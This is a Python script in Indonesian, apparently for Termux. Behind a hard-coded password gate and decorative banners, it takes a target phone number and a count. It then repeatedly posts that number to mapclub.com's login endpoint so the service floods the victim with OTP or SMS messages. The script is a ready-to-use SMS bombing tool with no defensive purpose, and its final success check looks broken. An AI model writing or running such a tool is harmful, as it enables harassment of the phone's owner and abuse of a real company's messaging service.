#!/bin/python

# jangan recode Surentot,tekentot,kentot

#module
import json
import requests
import sys
import os
import random
import time
from time import sleep
os.system('clear')
def mengetik(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(random.random() * 0.4)
print('Loading...')
sleep(0.1)
mengetik('> > > > > > > > > > > > ] 100 % Completed')
sleep(1)
os.system('clear')
def main():
        banner = '''
     \033[32;1m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
     \033[36;1m█-----\033[31;1m╦─╦╔╗╦─\033[34;1m╔╗╔╗╔╦╗╔╗\033[36;1m-----█
     \033[33;1m█-----\033[31;1m║║║╠─║─\033[34;1m║─║║║║║╠─\033[33;1m-----█
     \033[36;1m█-----\033[31;1m╚╩╝╚╝╚╝\033[34;1m╚╝╚╝╩─╩╚╝\033[36;1m-----█
     \033[32;1m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
     
\033[36;1m╔══════════════════════╗
\033[31;1m║╔════════════════════╗╚╗
\033[33;1m║║██░░░░░░░░░░░░░░░░░░╚╗╚╗
\033[32;1m║║██░░░\033[37;1mBattery Low \033[32;1m░░░─║║║
\033[35;1m║║██░░░░░░░░░░░░░░░░░░╔╝╔╝
\033[36;1m║╚════════════════════╝╔╝
\033[31;1m╚══════════════════════╝
\033[36;1m[\033[33;1m*\033[36;1m]\033[35;1m========================================================\033[36;1m[\033[33;1m*\033[36;1m]
\033[36;1m[\033[33;1m*\033[36;1m]\033[32;1m Author  : Reza Alfauzan XD                             \033[36;1m[\033[33;1m*\033[36;1m]
\033[36;1m[\033[33;1m*\033[36;1m]\033[32;1m Youtube : Reja gaming                                  \033[36;1m[\033[33;1m*\033[36;1m]
\033[36;1m[\033[33;1m*\033[36;1m]\033[32;1m Github  : Reaper-XD                                    \033[36;1m[\033[33;1m*\033[36;1m]
\033[36;1m[\033[33;1m*\033[36;1m]\033[32;1m Pesan   : Gua Masih Belajar Yaaaa!!                    \033[36;1m[\033[33;1m*\033[36;1m]
\033[36;1m[\033[33;1m*\033[36;1m]\033[35;1m========================================================\033[36;1m[\033[33;1m*\033[36;1m]'''
        print(banner)
        password = input ('Masukkan Kata Sandi : ')
        if password == 'Reza Gans':
                print ('Kata Sandi Benar!!')
                sleep(2)
                os.system('clear')
        else:
                print ('Kata Sandi Salah!!')
main()
def menu():
        os.system('clear')
        os.system('figlet Spam Pesan')
        banner = '''
\033[34;1m\033[32;1m=======================================
\033[32;1m=    \033[35;1m(+)Author    : \033[36;1mReza Alfauzan     =
\033[35;1m=    \033[36;1m(+)Youtube   : \033[33;1mReja Gaming       =
\033[36;1m=    \033[33;1m(+)Facebook  : \033[36;1mRzaa Ajaa         =
\033[32;1m=    \033[35;1m(+)Pesan     : \033[36;1mJangan Recode Ya  =
\033[35;1m=    \033[36;1m(+)Pesan     : \033[33;1mGua Masih Noob    =
\033[34;1m\033[32;1m=======================================
\033[32;1m====> \033[35;1mCoded \033[36;1mBy \033[36;1mReza \033[33;1m<====
> \033[36;1mWelcome To Termux <
\033[35;1m====> \033[36;1mGua \033[35;1mGanteng:v \033[36;1m<====
'''

        print(banner)
        no = input('\033[39;1mNomor \033[36;1mTarget \033[33;1m==> : ')
        jum = input('\033[36;1mJumlah \033[33;1mSpam \033[35;1m==> :')

        head = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
        "Referer": "https://www.mapclub.com/member/signup",
        "Host": "mapclub.com",
        }
        
        dat = {
        'phone' : no
        }
        
        
        for x in range(int(jum)):
                leosureo =requests.post("https://www.mapclub.com/member/login", headers=head, json=dat)
        if 'error' in leosureo:
                print('Gagal Mengirimn:)' + no)
        else:
                print('\033[35;1mBerhasil \033[33;1mMengirim :' + no)
menu()
